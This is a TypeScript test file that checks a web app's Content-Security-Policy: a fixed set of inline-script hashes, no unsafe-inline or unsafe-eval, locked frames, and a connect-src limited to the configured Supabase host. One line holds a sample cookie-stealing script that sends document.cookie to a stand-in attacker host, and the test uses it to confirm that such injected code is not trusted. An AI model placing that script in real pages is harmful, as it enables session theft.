// Content-Security-Policy on every HTML document (red-team residual): derived
// from the document's own inline <script> hashes, never 'unsafe-inline' for
// scripts, frames locked, third-party script hosts absent.
import { strict as assert } from "node:assert";
import { createHash } from "node:crypto";

process.env.PORT = String(process.env.PORT || "3353");
process.env.APP_DEPLOYMENT_MODE = "demo-preview";
process.env.DISABLE_OUTBOX_WORKER = "1";

const { buildContentSecurityPolicy, inlineScriptHashes, inlineScriptHash, trustedInlineScriptHashList, contentSecurityPolicy } = await import("../src/content_security_policy.js");
const { app } = await import("../src/app.js");

async function run(name: string, fn: () => Promise<void>) {
  try { await fn(); console.log(`PASS ${name}`); }
  catch (error) { console.error(`FAIL ${name}`); throw error; }
}

function directive(csp: string, name: string): string[] {
  const part = csp.split(";").map((s) => s.trim()).find((s) => s.startsWith(name + " "));
  assert.ok(part, `missing ${name} in ${csp}`);
  return part!.slice(name.length + 1).split(/\s+/);
}

await run("the script allow-list is a FIXED set of trusted inline hashes, never derived from the response", async () => {
  const trusted = trustedInlineScriptHashList();
  assert.ok(trusted.length >= 1, "the shell templates register at least one trusted inline script at startup");
  const csp = buildContentSecurityPolicy({});
  assert.deepEqual(directive(csp, "script-src"), ["'self'", ...trusted]);
  assert.ok(!/script-src[^;]*'unsafe-inline'/.test(csp), "no unsafe-inline scripts");
  assert.ok(!/script-src[^;]*'unsafe-eval'/.test(csp), "no unsafe-eval");
  assert.deepEqual(directive(csp, "frame-ancestors"), ["'none'"]);
  assert.deepEqual(directive(csp, "object-src"), ["'none'"]);
  assert.deepEqual(directive(csp, "base-uri"), ["'self'"]);
  // An injected script in a response is NOT blessed: its hash is absent from the policy.
  const injected = "fetch('https://evil.invalid/?c='+document.cookie)";
  assert.ok(!trusted.includes(inlineScriptHash(injected)));
  assert.ok(!contentSecurityPolicy({}).includes(inlineScriptHash(injected)));
  // Hash helper sanity.
  const body = "(function(){document.title='x'})();";
  assert.deepEqual(inlineScriptHashes(`<script>${body}</script><script src="/x.js"></script>`), [`'sha256-${createHash("sha256").update(body, "utf8").digest("base64")}'`]);
});

await run("the configured SUPABASE_URL host is admitted for connect-src, nothing else beyond the fixed list", async () => {
  const csp = buildContentSecurityPolicy({ SUPABASE_URL: "https://abcdefgh.supabase.co" });
  const connect = directive(csp, "connect-src");
  assert.ok(connect.includes("'self'"));
  assert.ok(connect.includes("https://abcdefgh.supabase.co"));
  assert.ok(connect.includes("wss://abcdefgh.supabase.co"));
  assert.ok(!connect.includes("https:"), "connect-src must not be a blanket https: allowance");
});

await run("every served HTML document carries a CSP whose hashes match its inline scripts; JSON does not", async () => {
  for (const url of ["/app", "/app/", "/preview/", "/pay/return", "/legal/terms"]) {
    const res = await app.inject({ method: "GET", url });
    if (res.statusCode === 404 && url === "/preview/") continue; // web/dist may not be built in this checkout
    assert.ok(String(res.headers["content-type"] || "").startsWith("text/html"), `${url} -> ${res.statusCode} ${res.headers["content-type"]}`);
    const csp = String(res.headers["content-security-policy"] || "");
    assert.ok(csp.length > 0, `${url} must carry a Content-Security-Policy`);
    const script = directive(csp, "script-src");
    // Every inline script the shell actually ships is admitted (else the app
    // would not boot), and the policy is the one fixed allow-list for all docs.
    for (const hash of inlineScriptHashes(res.body)) assert.ok(script.includes(hash), `${url} ships an inline script the fixed policy does not trust`);
    assert.deepEqual(script, ["'self'", ...trustedInlineScriptHashList()], `${url} must carry the fixed allow-list, not a per-response one`);
    assert.deepEqual(directive(csp, "frame-ancestors"), ["'none'"]);
  }
  const json = await app.inject({ method: "GET", url: "/readiness" });
  assert.equal(json.headers["content-security-policy"], undefined, "non-HTML responses carry no CSP");
});

await app.close();
